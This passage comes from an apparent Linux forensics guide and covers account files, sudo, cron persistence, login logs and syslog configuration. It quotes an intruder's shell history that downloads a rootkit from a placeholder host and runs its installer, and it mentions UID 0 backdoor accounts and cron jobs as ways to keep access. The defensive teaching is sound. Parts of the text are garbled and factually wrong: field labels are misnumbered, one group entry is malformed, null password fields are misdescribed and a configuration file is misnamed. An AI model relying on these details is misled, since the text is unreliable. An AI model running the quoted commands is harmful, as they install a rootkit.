The fields in the passwd file are:

- 1. Username (deprecated in favor of /etc/shadow)
- 2. Hashed password field
- 3. User ID (UID)
- 4. Primary group ID (GID) – Note that a user can belong to any number of groups. This information is stored in /etc/group
- 5. GECOS comment field – Generally used for a full username or a more descriptive name for a daemon account
- 6. User’s home directory
- 7. Shell/program to run upon initial login

As you can see, this field is fairly dense, even on a single-user system. An old trick that is still seen in the wild is to add an additional UID 0 user somewhere in the middle of the daemon accounts that pays no attention to. Note that any user with UID 0 is the functional equivalent of root. /etc/group is in a similar format, with fewer fields:

```
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:root,adm,daemon
tty:x:5:
disk:x:6:root
lp:x:7:daemon,lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
```

The first field is the group name, the second is the hash of the group password (password protected groups are not typically used), the third is the GID, and the fourth is a comma-separated list of the members of the group. Additional unauthorized users in the root or wheel groups are suspicious and warrant further investigation.

Finally, we have /etc/shadow, which stores encrypted user passwords and related information.


Again, the fields are as follows:

- Username
- Encrypted password
- Number of days since the epoch (1 Jan 1970) that the password was changed
- Minimum days between password changes
- Maximum time password is valid
- Number of days prior to expiration to warn users
- Absolute expiration date
- Reserved for future use

You may have noticed that the daemon accounts “bin” and “gdm” don’t have an encrypted password. As these are not interactive, a null password field prevents them from logging in. Any non-user accounts that have encrypted fields should be investigated. (img/fd8e5097b3755dbc07dc22fd8cb1fe_181.png)

## File Analysis

As you are hopefully aware, the root user is all-powerful on a standard Linux system, and gaining access to this user's privileges is usually of paramount importance to an intruder. For other reasons, access to root is strictly controlled. Unfortunately, some users may require root to run specific tasks beyond the capabilities of a normal user. There are a few ways to manage this using the setuid binaries, which we will discuss shortly, and the su command or the sudo command. The su command requires that the user knows the root password. The user is literally logging in as root from within their current session. Nothing is to stop the user from logging directly as root in the future. In a shared-root environment, you lose accountability should root do something intentionally or otherwise. This problem is solved by sudo, which allows for fine-grained granting of root powers to non-root users. A full analysis of the sudoers file is not warranted in this volume. Be just that you check for spurious or unauthorized entries if the particulars of your investigation indicate that an existing user was operating beyond their authority. This is controlled via the /etc/security file, which lists all the virtual terminals root may log in.

### Cron Jobs

"cron" is the main method for scheduling a task to run at some point in the future on a Linux system. As you can see, this is a great way to ensure continued access to a system you've compromised. There are two primary locations where cron will look for jobs: /var/spool/cron, which will contain the IDs of any users who have entered cron using the "crontab" command, and /etc/crontab, which will list additional locations for system-wide jobs. These are found in the directories /etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, and any others referred in /etc/crontab should be examined. This is an old but popular and effective way to maintain access on a compromised UNIX system.

### Log Files

Linux systems contain a plethora of log files, which may be of importance to an investigation. In this section, I will cover the ones that are most critical to answering key questions that come up in every investigation.

### Who

The key logs help determine who is involved in a given incident are the “last” logs, utmp and wtmp. utmp and wtmp are related. utmp is a database that records information about users currently logged into the system. This data is rolled into wtmp, which records historical data about logins. Generally this data is accessed on a live system by the “who” and “last” commands, but the who and last command also used to read /var/run/utmp and /var/log/wtmp during a post-mortem analysis:

### Where and What

Where the intruder went and what they did are questions that usually take more than logs (e.g., forensics) to answer. So, if a user's .bash_history contains something like:

```
w
cd /tmp
wget www.xxx.xxx.xxx/rootkit.tar.gz
tar xvzf rootkit.tar.gz
rm -rf rootkit.tar.gz
cd rootkit
./install
```

you have a pretty good indication that something is amiss. The other main source of information as to what happened on a system from a log perspective is the various syslog logs. Depending on the environment the system you are examining is in or come, it is entirely possible that it was logging to a remote syslog server. Check /etc/syslog.conf to see which logging facilities are directed to files or hosts; remote logging will be noted by an @ symbol preceding the host name. Here's a summarized example:

```
*.info;none;authpriv.none;cron.none /var/log/messages
authpriv.* /var/log/secure
mail.* @mail.server.localdomain
cron.* /var/log/cron
*.emerg *
uucp,news.crit /var/log/spool
local7.* /var/log/boot.log
```

In this case, if your investigation hinged on mail logs, you'd need to retrieve them from mail.server.localdomain. They won't be found on the local machine.
